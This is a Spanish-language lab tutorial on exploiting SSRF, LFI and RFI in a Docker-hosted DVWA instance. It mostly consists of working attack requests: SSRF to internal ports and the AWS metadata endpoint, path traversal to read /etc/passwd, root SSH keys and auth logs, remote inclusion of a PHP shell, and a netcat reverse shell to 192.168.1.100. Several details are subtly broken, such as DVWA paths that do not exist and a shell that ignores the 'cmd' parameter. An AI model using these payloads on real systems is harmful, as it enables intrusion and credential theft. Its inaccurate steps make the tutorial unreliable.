![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Laboratorio Explotación de SSRF, LFI y RFI con Kali Linux y Docker**

En este laboratorio, crearemos un entorno de pruebas en **Docker** con una aplicación vulnerable para aprender y explotar **Server-Side Request Forgery (SSRF)**, **Local File Inclusion (LFI)** y **Remote File Inclusion (RFI)**.

Utilizaremos herramientas de **Kali Linux** como **Burp Suite, wfuzz, gobuster y Metasploit** para detectar y explotar vulnerabilidades.

# **🔹 Objetivos de la Práctica**

✅ Configurar un entorno de pruebas seguro utilizando **Docker**.
✅ Identificar y explotar vulnerabilidades de **SSRF, LFI y RFI** en una aplicación web.
✅ Aprender técnicas avanzadas de evasión y post-explotación.
✅ Aplicar herramientas de **Kali Linux** para detectar y analizar vulnerabilidades.

# **🔹 Paso 1: Instalación del Entorno con Docker**

Para realizar la práctica, instalaremos **Docker** y desplegaremos **DVWA (Damn Vulnerable Web Application)**, que es una aplicación web con múltiples vulnerabilidades.

## **📌 1.1: Instalar Docker en Kali Linux**

Si aún no tienes Docker en tu Kali Linux, instálalo con los siguientes comandos:

```bash
sudo apt update && sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
```

Verifica que Docker esté funcionando correctamente:

```bash
docker --version
```

------

## **📌 1.2: Descargar e Iniciar DVWA**

DVWA es una aplicación web diseñada para pruebas de seguridad. La ejecutaremos en Docker.

```bash
docker pull vulnerables/web-dvwa
docker run --rm -d -p 80:80 vulnerables/web-dvwa
```

**Verifica que DVWA está corriendo:**
Abre tu navegador y visita:

👉 **http://localhost/login.php**

Credenciales por defecto:

- **Usuario:** `admin`
- **Contraseña:** `password`

**Configurar la seguridad en modo "Low"**

1. Ir a `http://localhost/security.php`
2. Seleccionar **Low** y guardar los cambios.

------

# **🔹 Paso 2: Identificación de Vulnerabilidades**

Antes de explotar las vulnerabilidades, debemos identificarlas utilizando herramientas de **Kali Linux**.

## **📌 2.1: Identificar rutas vulnerables con Gobuster**

Usaremos **Gobuster** para detectar directorios y archivos ocultos.

Instalación:

```bash
sudo apt install gobuster -y
```

Ejecutar escaneo:

```bash
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt
```

Esto nos revelará rutas interesantes, como:

```bash
/file.php
/include.php
/ssrf.php
```

------

## **📌 2.2: Enumeración de Parámetros con WFuzz**

`wfuzz` ayuda a encontrar parámetros ocultos en URLs.

Instalación:

```bash
sudo apt install wfuzz -y
```

Ejecutar un ataque de enumeración de parámetros:

```bash
wfuzz -u "http://localhost/file.php?FUZZ=test" -w /usr/share/wordlists/dirb/common.txt
```

Si obtenemos respuestas válidas, sabemos que `file.php` usa parámetros que podrían ser vulnerables.

------

# **🔹 Paso 3: Explotación de SSRF**

## **📌 3.1: Identificar una vulnerabilidad de SSRF**

Las vulnerabilidades **SSRF** permiten que un atacante haga que el servidor realice peticiones HTTP a otros sistemas.

Accedemos a `http://localhost/ssrf.php?url=http://example.com` y observamos la respuesta.

Si el servidor devuelve el contenido de `example.com`, significa que la aplicación es vulnerable a **SSRF**.

------

## **📌 3.2: Explotación SSRF para acceder a recursos internos**

Prueba acceder a servicios internos mediante SSRF:

```bash
http://localhost/ssrf.php?url=http://127.0.0.1:22
```

Si el servidor responde, significa que podemos acceder a servicios internos como **SSH, MySQL o Redis**.

------

## **📌 3.3: Escalar SSRF para robar metadatos de AWS**

Si la aplicación corre en AWS, podríamos acceder a los metadatos del servidor con:

```bash
http://localhost/ssrf.php?url=http://169.254.169.254/latest/meta-data/
```

Si esto devuelve información, podríamos obtener **credenciales de AWS**.

------

# **🔹 Paso 4: Explotación de LFI (Local File Inclusion)**

## **📌 4.1: Identificación de LFI**

Si la aplicación usa `file.php?file=about.html`, intentamos modificar el parámetro:

```bash
http://localhost/file.php?file=../../../../../etc/passwd
```

Si devuelve contenido del archivo **`/etc/passwd`**, es vulnerable a **LFI**.

------

## **📌 4.2: Leer Archivos del Servidor**

Podemos leer configuraciones críticas como:

### **💀 Usuarios del sistema**

```bash
http://localhost/file.php?file=../../../../../etc/passwd
```

### **💀 Claves SSH**

```bash
http://localhost/file.php?file=../../../../../root/.ssh/id_rsa
```

### **💀 Logs de autenticación**

```bash
http://localhost/file.php?file=../../../../../var/log/auth.log
```

------

# **🔹 Paso 5: Explotación de RFI (Remote File Inclusion)**

Si podemos incluir archivos remotos, podemos ejecutar código malicioso.

## **📌 5.1: Crear un archivo malicioso en Python**

Creamos un archivo PHP malicioso:

```bash
echo "<?php system('whoami'); ?>" > shell.php
```

Levantamos un servidor en Python:

```bash
python3 -m http.server 8080
```

Si `file.php` es vulnerable a **RFI**, intentamos incluirlo en la URL:

```bash
http://localhost/file.php?file=http://192.168.1.100:8080/shell.php
```

Si el servidor ejecuta `whoami`, significa que tenemos ejecución de comandos.

------

# **🔹 Paso 6: Post-Explotación y Persistencia**

## **📌 6.1: Conseguir una Shell Remota**

Si tenemos ejecución de comandos, podemos abrir una **shell reversa** con Netcat.

En **Kali Linux**, iniciamos un listener:

```bash
nc -lvnp 4444
```

Ejecutamos el siguiente payload en `file.php`:

```bash
http://localhost/file.php?file=http://192.168.1.100:8080/shell.php&cmd=nc -e /bin/bash 192.168.1.100 4444
```

Si la conexión se establece, tenemos **control total del servidor**. 🎯

# **🔹 Conclusión**

Esta práctica permite aprender y explotar **SSRF, LFI y RFI**, usando **Docker y herramientas de Kali Linux**.

Hemos demostrado cómo detectar vulnerabilidades con **Gobuster y wfuzz**, y cómo explotarlas usando **Burp Suite y Netcat**. 🚀



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)